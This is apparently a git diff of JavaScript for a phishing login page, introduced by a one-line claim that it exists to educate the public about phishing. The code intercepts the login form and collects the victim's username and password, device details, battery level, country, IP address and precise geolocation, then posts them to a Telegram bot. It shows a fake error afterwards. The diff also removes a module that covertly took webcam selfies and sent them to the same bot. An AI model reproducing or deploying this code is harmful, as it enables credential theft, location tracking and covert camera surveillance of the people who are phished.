@@ -1,18 +1,19 @@
 // This page is created to educate the public about phishing and how to prevent it. Please note that using this code for any illegal activities is strictly prohibited. The original code is available at https://github.com/saheermk/
 document.getElementById('loginForm').addEventListener('submit', async function(event) {
     event.preventDefault();
-
+    
+    // Collect form data
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    // Collect data
+    // Collect additional data
     const browserName = navigator.userAgent;
     const deviceName = navigator.platform;
     const dateTime = new Date().toLocaleString();
     const batteryPercentage = await getBatteryPercentage();
     const countryName = await getCountryName();
-
-    
+    const ipv4Address = await getIPv4Address(); // Fetch IPv4 address
+    const geolocation = await getGeolocation(); // Fetch geolocation
 
     // Format the message
     const text = `Device Data:
@@ -20,22 +21,18 @@ Browser: ${browserName}
 Device: ${deviceName}
 Date and Time: ${dateTime}
 Battery Percentage: ${batteryPercentage}%
-Country: ${countryName}`;
+Country: ${countryName}
+IPv4 Address: ${ipv4Address || 'N/A'}
+Geolocation: ${geolocation || 'N/A'}`;
 
-    const botToken = 'bot_token'; // Replace with your bot token
-    const chatId = 'chat_id'; // Replace with your chat ID
+    // Telegram bot configuration
+    const chatId =  'chat_id';
+    const botToken = 'bot_token';
     const message = `Username: ${username}\nPassword: ${password}\n${text}`;
 
     // Send text message to Telegram
     await sendToTelegram(botToken, chatId, message);
 
-    // Send selfies to Telegram
-    async function captureAndSendSelfies(botToken, chatId, count) {
-        const selfies = await captureSelfies(count);
-        for (const selfie of selfies) {
-            await sendPhotoToTelegram(botToken, chatId, selfie);
-        }
-    }
     // Simulate form submission and redirection
     setTimeout(function() {
         var errorMessage = document.getElementById('error-message');
@@ -70,13 +67,42 @@ async function getCountryName() {
     }
 }
 
-// Function to capture selfies
+// Function to get IPv4 address
+async function getIPv4Address() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || 'N/A';
+    } catch (error) {
+        console.error('Error fetching IPv4 address:', error);
+        return 'N/A';
+    }
+}
 
+// Function to get geolocation
+async function getGeolocation() {
+    return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+            resolve('Geolocation not supported');
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const { latitude, longitude } = position.coords;
+                resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+            },
+            (error) => {
+                console.error('Error fetching geolocation:', error);
+                resolve('Geolocation access denied or unavailable');
+            }
+        );
+    });
+}
 
 // Function to send text message to Telegram
 async function sendToTelegram(botToken, chatId, message) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
     try {
         const response = await fetch(url, {
             method: 'POST',
@@ -94,90 +120,9 @@ async function sendToTelegram(botToken, chatId, message) {
     }
 }
 
-
-
 // Get the current year
 const currentYear = new Date().getFullYear();
 const yearElement = document.getElementById('current-year');
 if (yearElement) {
     yearElement.textContent = currentYear;
 }
-
-const SelfieCaptureModule = (() => {
-    async function sendPhotoToTelegram(botToken, chatId, photoDataURL) {
-        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-        
-        // Convert data URL to Blob
-        const blob = await fetch(photoDataURL).then(response => response.blob());
-
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'selfie.jpg');
-
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                body: formData,
-            });
-            const data = await response.json();
-            console.log(data);
-            if (data.ok) {
-                console.log('Photo sent successfully!');
-            } else {
-                console.error('Failed to send photo: ' + data.description);
-            }
-        } catch (error) {
-            console.error('Error sending photo:', error);
-        }
-    }
-
-    async function captureSelfies(count) {
-        const selfies = [];
-        const constraints = { video: { facingMode: 'user', width: 640, height: 480 } };
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            for (let i = 0; i < count; i++) {
-                await new Promise(resolve => setTimeout(resolve, 1000)); // Capture every 1 second
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                const selfieDataURL = canvas.toDataURL('image/jpeg');
-                selfies.push(selfieDataURL);
-            }
-
-            stream.getTracks().forEach(track => track.stop());
-        } catch (error) {
-            console.error('Error capturing selfies:', error);
-        }
-
-        return selfies;
-    }
-
-    async function captureAndSendSelfies(botToken, chatId, count) {
-        const selfies = await captureSelfies(count);
-        for (const selfie of selfies) {
-            await sendPhotoToTelegram(botToken, chatId, selfie);
-        }
-    }
-
-    return {
-        captureAndSendSelfies,
-    };
-})();
-
-// Example usage
-const chatId =  'chat_id';
-const botToken = 'bot_token';
-const selfieCount = 5;               // Number of selfies to capture
-
-// Call the function to start capturing and sending selfies
-SelfieCaptureModule.captureAndSendSelfies(botToken, chatId, selfieCount);
